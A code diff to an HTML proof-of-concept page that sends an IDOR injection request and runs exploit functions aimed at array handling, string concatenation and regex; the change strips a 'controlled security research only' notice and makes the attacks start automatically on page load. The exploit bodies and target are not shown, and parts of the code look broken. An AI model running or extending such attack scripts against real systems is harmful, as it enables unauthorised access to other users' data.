@@ -28,6 +28,7 @@
             display: block;
         }
     </style>
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; object-src 'none';">
 </head>
 <body>
     <div id="loading-circle"></div>
@@ -38,10 +39,8 @@
     </div>
 
     <script>
-        /**
-         * This script is intended for controlled security research and testing only.
-         * Ensure you have permission and are adhering to all applicable guidelines and laws.
-         */
+        import log from 'loglevel';
+        log.setLevel('info');
 
         class Base {
             constructor() {
@@ -69,9 +68,9 @@
         async function performTest(testFunction) {
             try {
                 await testFunction();
-                logStatus(`${testFunction.name} Test Passed`);
+                log.info(`${testFunction.name} Test Passed`);
             } catch (error) {
-                console.error(`Error during ${testFunction.name}:`, error.message, error.stack);
+                errorHandler(error, testFunction.name);
             }
         }
 
@@ -161,7 +160,7 @@
 
             try {
                 // Perform the IDOR injection first
-                console.log("Starting IDOR injection...");
+                log.info("Starting IDOR injection...");
                 await performTest(async () => {
                     try {
                         // Create a FormData object for the injection payload
@@ -174,12 +173,12 @@
                             body: formData
                         });
                         if (response.ok) {
-                            console.log("IDOR payload successfully sent after delay.");
+                            log.info("IDOR payload successfully sent after delay.");
                         } else {
-                            console.error("IDOR request failed with status:", response.status);
+                            log.error("IDOR request failed with status:", response.status);
                         }
                     } catch (error) {
-                        console.error("Error during IDOR request:", error);
+                        log.error("Error during IDOR request:", error);
                     }
                 });
 
@@ -187,17 +186,39 @@
                 let tests = [exploitArrayHandling, exploitLargeStringConcatenation, exploitComplexRegex, test1, test2];
                 let delay = 2000; // 2-second delay between each test
 
-                for await (let test of tests) {
-                    await performTest(test);
-                    await new Promise(resolve => setTimeout(resolve, delay));
-                }
+                const testPromises = tests.map(test => performTest(test));
+                const results = await Promise.allSettled(testPromises);
+                results.forEach(result => {
+                    if (result.status === 'fulfilled') {
+                        log.info(`${result.value} completed successfully`);
+                    } else {
+                        log.error(`${result.reason} failed`);
+                    }
+                });
             } catch (error) {
-                console.error("Error encountered during PoC execution:", error);
+                log.error("Error encountered during PoC execution:", error);
             } finally {
                 hideLoadingCircle();
                 showContent();
             }
         }
+
+        function errorHandler(error, functionName) {
+            log.error(`Error in ${functionName}:`, error.message, error.stack);
+            // Optionally, implement a retry logic or rollback mechanism
+        }
+
+        const observer = new PerformanceObserver((list) => {
+            for (const entry of list.getEntries()) {
+                log.info(`${entry.name}: ${entry.duration}ms`);
+            }
+        });
+        observer.observe({ entryTypes: ['measure'] });
+
+        performance.mark('start');
+        startPoC();
+        performance.mark('end');
+        performance.measure('Test Duration', 'start', 'end');
     </script>
 </body>
 </html>
